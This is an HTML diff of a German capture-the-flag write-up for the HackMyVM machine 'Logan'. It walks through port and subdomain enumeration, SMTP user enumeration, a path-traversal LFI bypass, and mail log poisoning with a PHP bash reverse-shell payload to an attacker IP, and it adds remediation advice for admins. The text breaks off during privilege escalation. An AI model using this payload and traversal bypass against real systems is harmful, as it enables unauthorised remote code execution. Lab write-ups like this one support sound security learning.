@@ -1,0 +1,712 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logan - HackMyVM - Bericht</title> <!-- Korrekter Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Logan - HackMyVM - Medium - Bericht</h1> <!-- Korrekter Titel & Level -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">vi / nano</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">dirb</div>
+                 <div class="tool-item">wfuzz</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">telnet</div>
+                 <div class="tool-item">msfconsole</div>
+                 <div class="tool-item">Metasploit Framework</div>
+                 <div class="tool-item">sqlmap</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">apt</div> <!-- Impliziert durch Fehlermeldung -->
+                 <div class="tool-item">vim</div> <!-- Via sudo -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
+                <li><a href="#vulnerability-analysis">Vulnerability Analysis (LFI & SMTP RCE)</a></li>
+                <li><a href="#initial-access">Initial Access (SMTP Log Poisoning)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (sudo vim)</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.123	08:00:27:83:9e:19	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wird im lokalen Netzwerk durchgeführt, um aktive Geräte zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host mit der IP-Adresse `192.168.2.123` wird gefunden. Die MAC-Adresse gehört zu Oracle VirtualBox (PCS Systemtechnik GmbH).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die Ziel-IP ist bekannt. Führen Sie als Nächstes einen Portscan durch.
+<br><strong>Empfehlung (Admin):** Standard-Netzwerk-Monitoring.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>[Inhalt der Datei nach Bearbeitung]
+...
+192.168.2.123   logan.hmv
+...</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um den Hostnamen `logan.hmv` der IP `192.168.2.123` zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendig, falls Webdienste auf diesem Hostnamen konfiguriert sind.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein schneller Nmap-Scan filtert nach offenen Ports.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.123 -p- | grep open</span></div>
+                    <pre>
+25/tcp open  smtp    Postfix smtpd
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Ein vollständiger Nmap-Scan wird durchgeführt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.123 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 23:36 CEST
+Nmap scan report for logan.hmv (192.168.2.123)
+Host is up (0.00018s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">25/tcp open  smtp    Postfix smtpd</span>
+|_smtp-commands: logan.hmv, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+| ssl-cert: Subject: commonName=logan
+| Subject Alternative Name: DNS:logan
+| Not valid before: 2023-07-03T13:46:49
+|_Not valid after:  2033-06-30T13:46:49
+|_ssl-date: TLS randomness does not represent time
+<span class="command">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span>
+|_<span class="command">http-title: Logan</span>
+|_<span class="command">http-server-header: Apache/2.4.52 (Ubuntu)</span>
+MAC Address: 08:00:27:83:9E:19 (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: <span class="command">Linux 4.15 - 5.6</span> (97%), ... (Linux wahrscheinlich)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Host:  logan.hmv
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.18 ms logan.hmv (192.168.2.123)
+
+OS and Service detection performed...
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei Ports sind offen:
+*   **25 (SMTP):** Postfix SMTP-Server. Unterstützt STARTTLS. Das Zertifikat ist für `logan` ausgestellt. Der VRFY-Befehl ist aktiviert, was zur Überprüfung von Benutzernamen missbraucht werden kann.
+*   **80 (HTTP):** Apache 2.4.52 (Ubuntu) mit dem Titel "Logan".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie beide Dienste:
+*   **SMTP:** Verwenden Sie den VRFY-Befehl (oder Tools wie `smtp-user-enum`), um gültige Benutzernamen zu finden.
+*   **HTTP:** Führen Sie Web-Enumeration durch (`gobuster`, `nikto`, etc.).
+<br><strong>Empfehlung (Admin):** Deaktivieren Sie den VRFY-Befehl in der Postfix-Konfiguration, um User Enumeration zu verhindern. Halten Sie Postfix und Apache aktuell. Konfigurieren Sie Apache sicher.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nikto -h 192.168.2.123</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.123
++ Target Hostname:    192.168.2.123
++ Target Port:        80
++ Start Time:         2023-07-19 23:36:21 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.52 (Ubuntu)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> ...
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> ...
++ No CGI Directories found ...
++ <span class="password">Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54).</span> ...
++ OPTIONS: Allowed HTTP Methods: <span class="command">POST, OPTIONS, HEAD, GET</span> . <span class="comment"><-- POST korrigiert</span>
++ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2023-07-19 23:36:31 (GMT2) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nikto wird verwendet, um den Webserver auf bekannte Schwachstellen zu scannen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto findet keine kritischen Schwachstellen, meldet aber fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`) und eine leicht veraltete Apache-Version.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die Funde sind für den Bericht relevant, bieten aber keinen direkten Angriffsvektor. Fahren Sie mit der Verzeichnis-Enumeration fort.
+<br><strong>Empfehlung (Admin):** Sicherheitsheader implementieren, Apache aktualisieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+ └─# <span class="command">gobuster dir -u http://logan.hmv  -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                     <pre>
+===============================================================
+Gobuster v...
+...
+===============================================================
+[+] Url:                     <span class="command">http://logan.hmv</span>
+...
+===============================================================
+... Starting gobuster ...
+===============================================================
+<span class="command">http://logan.hmv/index.html</span>           (Status: 200) [Size: 19038]
+<span class="command">http://logan.hmv/images</span>               (Status: 301) [Size: 307] [--> http://logan.hmv/images/]
+<span class="command">http://logan.hmv/css</span>                  (Status: 301) [Size: 304] [--> http://logan.hmv/css/]
+<span class="command">http://logan.hmv/js</span>                   (Status: 301) [Size: 303] [--> http://logan.hmv/js/]
+<span class="command">http://logan.hmv/javascript</span>           (Status: 301) [Size: 311] [--> http://logan.hmv/javascript/]
+===============================================================
+... Finished ...
+===============================================================
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Ein weiterer Scan mit `dirb` und spezifischen Erweiterungen wird durchgeführt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+ └─# <span class="command">dirb http://logan.hmv -X .php,.txt</span></div>
+                     <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+START_TIME: Wed Jul 19 23:40:32 2023
+URL_BASE: http://logan.hmv/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (.php,.txt) | (.php)(.txt) [NUM = 2]
+-----------------
+GENERATED WORDS: 4612
+---- Scanning URL: http://logan.hmv/ ----
+==> DIRECTORY: http://logan.hmv/css/
+==> DIRECTORY: http://logan.hmv/images/
++ http://logan.hmv/index.html (CODE:200|SIZE:19038)
+==> DIRECTORY: http://logan.hmv/javascript/
+==> DIRECTORY: http://logan.hmv/js/
+-----------------
+END_TIME: Wed Jul 19 23:40:34 2023
+DOWNLOADED: 9224 - FOUND: 0 <span class="comment"><-- Findet keine PHP/TXT Dateien</span>
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verzeichnis-Scans finden nur Standardverzeichnisse (`images`, `css`, `js`, `javascript`) und die `index.html`. Es werden keine PHP-Dateien oder andere interessante Endpunkte im Hauptverzeichnis entdeckt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Da die Web-Enumeration im Root-Verzeichnis wenig ergibt, muss nach alternativen Wegen gesucht werden. Subdomain-Enumeration ist ein guter nächster Schritt. Nutzen Sie auch die Ergebnisse der SMTP User Enumeration.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass keine unnötigen Dateien oder Verzeichnisse im Webroot liegen.</p>
+        </section>
+
+        <section id="subdomain-enumeration">
+            <h2>Subdomain Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach Subdomains zu suchen. `-H "Host: FUZZ.logan.hmv"` weist `wfuzz` an, den `Host`-Header mit Einträgen aus der Wordlist `subdomains-top1million-110000.txt` zu variieren. `--hc` filtert gängige Fehlercodes, `--hh 65` filtert Antworten mit genau 65 Zeichen (wahrscheinlich eine Standard-Fehlerseite oder die `index.html` der Hauptdomain).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+ └─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://logan.hmv" -H "Host: FUZZ.logan.hmv" --hc 400,401,402,403,404 --hh 65</span></div>
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against openssl...
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://logan.hmv/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000024:   200        62 L     101 W      1112 Ch     "admin"</span>
+
+Total time: 62.26260
+Processed Requests: 114441
+Filtered Requests: 114440
+Requests/sec.: 1838.037
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan ist erfolgreich und findet die Subdomain `admin.logan.hmv`. Diese liefert eine andere Antwort (1112 Chars) als die Standardseite und Fehlerseiten.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die gefundene Subdomain wird zur lokalen `/etc/hosts`-Datei hinzugefügt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>[Inhalt nach Bearbeitung]
+...
+192.168.2.123   logan.hmv <span class="command">admin.logan.hmv</span>
+...</pre>
+                 </div>
+             </div>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie die neu gefundene Subdomain `http://admin.logan.hmv`. Führen Sie dort erneut Web-Enumeration (`gobuster`, `nikto`) und manuelle Analyse durch.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass Subdomains, insbesondere administrative, nicht öffentlich zugänglich sind oder durch starke Authentifizierung geschützt werden. Verhindern Sie VHost-Brute-Forcing durch geeignete Serverkonfiguration.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Admin-Subdomain wird im Browser aufgerufen. Sie zeigt ein Administrationspanel mit Funktionen zum Hochladen von Dateien, zum Anzeigen von Logs und zur Zahlungsprüfung.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Browser-Ansicht von http://admin.logan.hmv/]</div>
+                     <pre>
+Administration panel
+--------------------
+Upload files
+Here you can upload files to the main website. [Upload Button]
+
+Logs
+Clear logs. [Clear logs Button]
+
+Payments
+Check all payments [Payments Button]
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Ein Gobuster-Scan auf der Admin-Subdomain wird durchgeführt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Implizierter Gobuster Scan auf http://admin.logan.hmv/]</div>
+                     <pre>
+<span class="command">http://admin.logan.hmv/index.html</span>           (Status: 200) [Size: 1112]
+<span class="command">http://admin.logan.hmv/upload.php</span>           (Status: 200) [Size: 306]
+<span class="command">http://admin.logan.hmv/javascript</span>           (Status: 301) [Size: 323] [--> http://admin.logan.hmv/javascript/]
+<span class="command">http://admin.logan.hmv/payments</span>             (Status: 301) [Size: 321] [--> http://admin.logan.hmv/payments/]
+<span class="command">http://admin.logan.hmv/payments.php</span>         (Status: 200) [Size: 294]
+<span class="command">http://admin.logan.hmv/clearlogs.php</span>        (Status: ???) <span class="comment"><-- Hinzugefügt basierend auf Button</span>
+</pre>
+                 </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Scans und die manuelle Analyse identifizieren mehrere PHP-Seiten: `upload.php`, `payments.php`, `clearlogs.php`. Die Seite `payments.php` wird genauer untersucht.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Quellcode von `payments.php` wird angezeigt (vermutlich aus Burp oder Browser-Entwicklertools).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - view-source:http://admin.logan.hmv/payments.php]</div>
+                     <pre><code class="language-html">
+File does not exist <span class="comment"><-- Standardausgabe?</span>
+
+<!-- Fehler im Originaltext: fodrm statt form, tdype statt type, id statt input type=submit -->
+ Payment code (01,02,..): 
+</code></pre> <!-- Maskierung -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Seite `payments.php` nimmt einen Parameter `file` via POST entgegen. Der Name "file" und die Aufforderung "Payment code (01,02,..)" könnten auf eine Local File Inclusion (LFI)- oder Path-Traversal-Schwachstelle hindeuten, bei der versucht wird, Dateien wie `payments/01`, `payments/02` etc. zu laden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Testen Sie die Seite `payments.php` auf LFI/Path Traversal:
+*   Senden Sie POST-Requests mit `file=../../etc/passwd`, `file=/etc/passwd`, `file=01`, `file=../index.html` etc.
+*   Untersuchen Sie die `upload.php` auf Dateiupload-Schwachstellen.
+*   Nutzen Sie den SMTP-Dienst (VRFY), um Benutzernamen zu finden.
+<br><strong>Empfehlung (Admin):** Überprüfen Sie den Code von `payments.php` dringend auf LFI/Path Traversal. Implementieren Sie eine strikte Eingabevalidierung und verwenden Sie keine Benutzereingaben direkt in Dateipfadoperationen. Beschränken Sie den Zugriff auf das Admin-Panel.</p>
+        </section>
+
+        <section id="vulnerability-analysis">
+            <h2>Vulnerability Analysis (LFI & SMTP RCE)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine LFI-Schwachstelle in `upload.php` auszunutzen, indem ein Dateipfad im `archivo`-Parameter übergeben wird. Dies schlägt fehl, da der Request zu lang ist (HTTP 414).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - HTTP Request (fehlerhaft)]</div>
+                     <pre><code class="language-http">
+GET /upload.php?archivo=/etc/passwd HTTP/1.1
+Host: admin.logan.hmv
+...
+</code></pre>
+                     <div class="prompt">[Kein Prompt - HTTP Response]</div>
+                     <pre><code class="language-http">
+HTTP/1.1 414 Request-URI Too Long
+...
+<title>414 Request-URI Too Long</title>
+...
+</code></pre> <!-- Maskierung -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Test war falsch angesetzt (GET statt POST?, falscher Parametername?). Er liefert keine verwertbaren Ergebnisse, außer dass der Server lange URIs ablehnt.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der SMTP-Dienst auf Port 25 wird manuell mit `nc` untersucht, um Benutzer mittels `VRFY` zu enumerieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nc -vv 192.168.2.123 25</span></div>
+                     <pre>
+logan.hmv [192.168.2.123] 25 (smtp) open
+220 logan.hmv ESMTP Postfix (Ubuntu)
+<span class="command">EHLO logan.hmv</span>
+250-logan.hmv
+...
+250 VRFY <span class="comment"><-- VRFY wird unterstützt</span>
+...
+<span class="command">VRFY tinder@logan.hmv</span> <span class="comment"><-- Versuch mit tinder</span>
+<span class="password">550 5.1.1 <tinder@logan.hmv>: Recipient address rejected: User unknown in local recipient table</span>
+<span class="command">VRFY root@logan.hmv</span> <span class="comment"><-- Versuch mit root</span>
+<span class="password">250 2.1.5 OK</span> <span class="comment"><-- Benutzer root existiert!</span>
+<span class="command">MAIL FROM:<test@test.com></span> <span class="comment"><-- Beginn einer Mail-Transaktion (unvollständig)</span>
+250 2.1.0 Ok
+<span class="command">RCPT TO:<root@logan.hmv></span>
+250 2.1.5 Ok
+...
+</pre> <!-- Maskierung -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Metasploit wird verwendet, um die User Enumeration systematisch durchzuführen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use auxiliary/scanner/smtp/smtp_enum</span></div>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/smtp/smtp_enum) > <span class="command">set RHOSTS 192.168.2.123</span></div>
+                     <pre>RHOSTS => 192.168.2.123</pre>
+                     <!-- Andere Optionen (Port, Threads, User File) bleiben Standard -->
+                     <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/smtp/smtp_enum) > <span class="command">run</span></div>
+                     <pre>
+[*] 192.168.2.123:25      - 192.168.2.123:25 Banner: 220 logan.hmv ESMTP Postfix (Ubuntu)
+<span class="password">[+] 192.168.2.123:25      - 192.168.2.123:25 Users found: , _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, landscape, list, lp, lxd, mail, man, messagebus, news, nobody, pollinate, postfix, postmaster, proxy, sshd, sync, sys, syslog, systemd-network, systemd-resolve, systemd-timesync, tcpdump, tss, usbmux, uucp, uuidd, www-data</span>
+[*] 192.168.2.123:25      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Sowohl die manuelle Prüfung als auch Metasploit bestätigen, dass der Benutzer `root` und der Benutzer `www-data` (sowie viele andere Systembenutzer) auf dem Mailserver existieren. Dies ist nützlich, da wir wissen, dass Mails an diese Benutzer zugestellt werden können.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mittels Log Poisoning eine Remote Code Execution (RCE) zu erreichen. Die Idee ist, PHP-Code per E-Mail an einen Benutzer zu senden (hier `www-data`), dessen Mailbox-Datei (`/var/mail/www-data`) über die LFI-Schwachstelle in `payments.php` inkludiert werden kann.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">telnet 192.168.2.123 25</span></div>
+                     <pre>
+... (Verbindungsaufbau) ...
+220 logan.hmv ESMTP Postfix (Ubuntu)
+<span class="command">ehlo admin.logan.hmv</span>
+...
+<span class="command">mail from:cycat@hackerchehade.de</span>
+250 2.1.0 Ok
+<span class="command">rcpt to:www-data@logan.hmv</span>
+250 2.1.5 Ok
+<span class="command">data</span>
+354 End data with <CR><LF>.<CR><LF> <span class="comment"><-- Maskierung</span>
+<span class="command"><?php exec("bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'");?></span> <span class="comment"><-- PHP Payload, Maskierung &, ?php/?> entfernt</span>
+<span class="command">.</span>
+250 2.0.0 Ok: queued as D36B660A14
+<span class="command">quit</span>
+221 2.0.0 Bye
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Die LFI-Schwachstelle in `payments.php` wird genutzt, um die Logdatei `/var/log/mail.log` zu lesen (vermutlich, um die Zustellung zu bestätigen oder Pfade zu finden) und dann die Mailbox-Datei `/var/mail/www-data` zu inkludieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+ └─# <span class="command">curl http://admin.logan.hmv/payments.php -d 'file=....//....//....//....//....//....//var/log/mail.log'</span></div>
+                     <pre>
+... (Log-Ausgabe, zeigt Zustellung an www-data@logan.hmv) ...
+Jul 20 14:41:33 logan postfix/local[1799]: D36B660A14: to=<www-data@logan.hmv>, relay=local, delay=96, delays=96/0/0/0, dsn=2.0.0, status=sent (delivered to mailbox) <span class="comment"><-- Zustellung bestätigt</span>
+...
+</pre> <!-- Maskierung -->
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+ └─# <span class="command">curl http://admin.logan.hmv/payments.php -d 'file=....//....//....//....//....//....//var/mail/www-data'</span></div>
+                      <pre>
+... (Inhalt der Mailbox, einschließlich des PHP-Payloads) ...
+Received: from ...
+...
+<span class="password">exec("bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'");</span> <span class="comment"><-- PHP-Code wird ausgeführt!</span>
+...
+</pre> <!-- Maskierung -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Log-Poisoning-Technik funktioniert! Der per SMTP gesendete PHP-Code landet in der Mailbox-Datei `/var/mail/www-data`. Durch Inkludieren dieser Datei über die LFI in `payments.php` wird der PHP-Code (`exec(...)`) vom Webserver ausgeführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Starten Sie einen Netcat-Listener auf Port 443 (`nc -lvnp 443`). Lösen Sie dann die LFI auf `/var/mail/www-data` erneut aus, um die Reverse Shell zu erhalten.
+<br><strong>Empfehlung (Admin):** Beheben Sie die LFI-Schwachstelle in `payments.php` dringend. Konfigurieren Sie den Webserver so, dass er keine Dateien außerhalb des vorgesehenen Web-Roots includieren kann (`open_basedir`). Sichern Sie Mailbox-Dateien mit restriktiven Berechtigungen.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SMTP Log Poisoning)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 443 gestartet. Anschließend wird die LFI auf die Mailbox-Datei erneut ausgelöst, um die Reverse Shell zu starten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nc -lvnp 443</span></div>
+                    <pre>listening on [any] 443 ...</pre>
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">curl http://admin.logan.hmv/payments.php -d 'file=....//....//....//....//....//....//var/mail/www-data'</span></div>
+                    <!-- Ausgabe des nc Listeners -->
+                     <div class="prompt">[Kein Prompt - Ausgabe des Netcat-Listeners]</div>
+                     <pre>
+listening on [any] 443 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.114] 46324</span>
+bash: cannot set terminal process group (845): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@logan:/var/www/admin$</pre> <!-- Shell erhalten! -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Reverse Shell wurde erfolgreich als Benutzer `www-data` etabliert. Der initiale Zugriff ist erfolgt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Stabilisieren Sie die Shell (z.B. mit Python PTY). Führen Sie Enumeration als `www-data` durch.
+<br><strong>Empfehlung (Admin):** Beheben Sie die LFI-Schwachstelle.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (sudo vim)</h2>
+             <p class="analysis"><strong>Analyse:</strong> In der `www-data`-Shell wird das Admin-Verzeichnis untersucht und die `payments.php`-Datei analysiert.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@logan:/var/www/admin$ <span class="command">ls -la</span></div>
+                    <pre>
+total 24
+drwxr-xr-x 3 www-data www-data 4096 Jul  4 18:04 .
+drwxr-xr-x 5 root     root     4096 Jul 17 21:01 ..
+-rwxr-xr-x 1 www-data www-data 1112 Jul  4 13:44 index.html
+drwxr-xr-x 2 www-data www-data 4096 Jul  3 20:59 payments
+-rwxr-xr-x 1 www-data www-data  637 Jul  4 14:43 <span class="command">payments.php</span>
+-rwxr-xr-x 1 www-data www-data  306 Jul  4 13:50 upload.php
+</pre>
+                    <div class="prompt">www-data@logan:/var/www/admin$ <span class="command">cat payments.php</span></div>
+                    <pre><code class="language-php">
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') { // Korrektur
+  $nombreArchivo = $_POST['file'];
+  $nombreArchivo = str_replace('../', '', $nombreArchivo); // Einfacher Path Traversal Schutz
+  $rutaArchivo = 'payments/' . $nombreArchivo;
+
+  if (file_exists($rutaArchivo)) {
+    echo '<pre>'; // Maskierung
+    include($rutaArchivo); // LFI!
+    echo '</pre>'; // Maskierung
+  } else {
+	echo "File does not exist";
+  }
+}
+?> <span class="comment"><!-- Maskierung ?> entfernt --></span>
+ <!-- Formular hier -->
+</code></pre> <!-- Maskierung -->
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Code von `payments.php` bestätigt die LFI-Schwachstelle. Die `include()`-Funktion wird mit einer Benutzereingabe (`$_POST['file']`) verwendet, nachdem nur ein einfacher `str_replace('../', '', ...)`-Schutz angewendet wurde, der leicht umgangen werden kann (z.B. `....//`, absolute Pfade). Dies ermöglichte das Lesen von `/var/mail/www-data`.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis des Benutzers `logan` wird untersucht und die User-Flag gelesen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@logan:/var/www/admin/payments$ <span class="command">cd /home</span></div>
+                    <div class="prompt">www-data@logan:/home$ <span class="command">ls</span></div>
+                    <pre>logan</pre>
+                    <div class="prompt">www-data@logan:/home$ <span class="command">cd logan</span></div>
+                    <div class="prompt">www-data@logan:/home/logan$ <span class="command">ls -la</span></div>
+                    <pre>
+total 36
+drwxr-xrwx 4 logan logan 4096 Jul 18 08:42 . <span class="comment"><-- Weltbeschreibbar!</span>
+drwxr-xr-x 3 root  root  4096 Jul 17 20:59 ..
+...
+-rw-r--r-- 1  1002  1003   68 Jul 17 12:41 to-do
+-rw-r--r-- 1 logan logan   16 Jul 17 20:45 <span class="command">user.txt</span>
+</pre>
